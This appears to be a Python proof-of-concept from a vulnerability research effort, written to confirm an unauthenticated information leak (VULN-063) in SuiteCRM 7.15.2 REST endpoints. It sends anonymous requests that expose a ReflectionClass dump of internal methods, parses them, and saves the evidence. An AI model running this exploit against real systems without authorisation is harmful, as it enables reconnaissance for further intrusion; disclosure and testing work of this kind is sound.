#!/usr/bin/env python3
"""
VULN-063 -- Unauthenticated ReflectionClass dump of the SOAP/REST implementation.

Software   : SuiteCRM
Repository : https://github.com/SuiteCRM/SuiteCRM
Affected   : 7.15.2, commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink       : service/core/REST/SugarRest.php:78-86 -- serve() runs BEFORE any session
             check; when $_REQUEST['method'] is empty it echoes (string)(new
             ReflectionClass(get_class($this->implementation))).

What this script does
----------------------
1. Anonymous GET to /service/v4_1/rest.php with NO 'method' parameter at all (and no
   session/cookies whatsoever).
2. Confirms the response is an unauthenticated HTML <pre> block containing a full
   PHP ReflectionClass dump of SugarWebServiceImplv4_1 -- every public/private/protected
   method signature, property and constant of the legacy web-service implementation.
3. Extracts concrete proof: the class name, and enumerates disclosed method names that
   are NOT part of any public API documentation (e.g. job_queue_next/cycle/run --
   the exact methods behind VULN-080), proving this is a real information leak an
   attacker can harvest before authenticating at all.
4. Repeats against v2/v3/v4 siblings to show it is not a one-off.
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import BASE_URL, log, banner, verdict, BROWSER_UA

import requests

VULN_ID = "VULN-063"
HERE = os.path.dirname(os.path.abspath(__file__))


def probe(anon, version):
    url = f"{BASE_URL}/service/{version}/rest.php"
    log("STEP", f"GET {url}  (no 'method' param, no session/cookies)")
    r = anon.get(url, timeout=30)
    return r


def main():
    banner(VULN_ID, "unauthenticated ReflectionClass dump of the web-service implementation")

    log("INFO", "Brand-new anonymous requests.Session() -- zero credential material")
    anon = requests.Session()
    anon.headers.update({"User-Agent": BROWSER_UA})

    r = probe(anon, "v4_1")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"GET {r.request.path_url} HTTP/1.1\n"
                f"Host: {BASE_URL.split('//', 1)[1]}\n"
                + "\n".join(f"{k}: {v}" for k, v in r.request.headers.items()) + "\n\n")

    resp_headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP/1.1 {r.status_code} {r.reason}\n{resp_headers}\n\n{r.text}\n")
    with open(os.path.join(HERE, "evidence", "v4_1_reflection_dump.html"), "w") as f:
        f.write(r.text)

    log("INFO", f"HTTP {r.status_code}, {len(r.text)} bytes returned")

    m = re.search(r"Class\s*\[\s*<[^>]*>\s*class\s+(\w+)", r.text)
    class_name = m.group(1) if m else None

    if "<pre>" not in r.text or "ReflectionClass" not in r.text and "Class [" not in r.text:
        verdict(VULN_ID, "FAILED", f"response did not look like a reflection dump; first 300 chars: {r.text[:300]!r}")
        sys.exit(1)

    # Pull out method names via the "Method [ ... method <name> ]" reflection pattern.
    methods = sorted(set(re.findall(r"Method\s*\[\s*<[^>]*>\s*(?:\w+\s+)*?method\s+([A-Za-z_][A-Za-z0-9_]*)\s*\]", r.text)))
    interesting = [m for m in methods if m.startswith("job_queue_") or m.startswith("oauth_")]

    log("PROOF", f"Reflected class = {class_name!r}; {len(methods)} method signatures disclosed "
                 f"(unauthenticated); includes internal/undocumented methods: {interesting}")
    log("PROOF", f"First 400 chars of body: {r.text[:400]!r}")

    if class_name != "SugarWebServiceImplv4_1":
        log("INFO", f"NOTE: expected class SugarWebServiceImplv4_1, got {class_name!r} -- recording as-is.")

    # Cross-check v2/v3/v4 siblings behave the same way (per the static finding).
    sibling_results = {}
    for version in ("v2", "v3", "v4"):
        rr = probe(anon, version)
        ok = "<pre>" in rr.text and "Class [" in rr.text
        sibling_results[version] = (rr.status_code, ok, len(rr.text))
        with open(os.path.join(HERE, "evidence", f"{version}_reflection_dump.html"), "w") as f:
            f.write(rr.text)
        log("INFO", f"sibling {version}: HTTP {rr.status_code}, reflection-dump-shaped={ok}, {len(rr.text)} bytes")

    all_siblings_leak = all(ok for (_, ok, _) in sibling_results.values())

    if not methods or not class_name:
        verdict(VULN_ID, "FAILED", "could not parse a class name / method list out of the response")
        sys.exit(1)

    log("OK", f"Unauthenticated reflection dump confirmed on v4_1 and siblings={list(sibling_results.keys())} "
              f"(all leak={all_siblings_leak})")
    verdict(VULN_ID, "CONFIRMED",
            f"anonymous GET with empty method= returned a full ReflectionClass dump of {class_name} "
            f"({len(methods)} methods disclosed, incl. {interesting}) -- zero authentication")
    sys.exit(0)


if __name__ == "__main__":
    main()
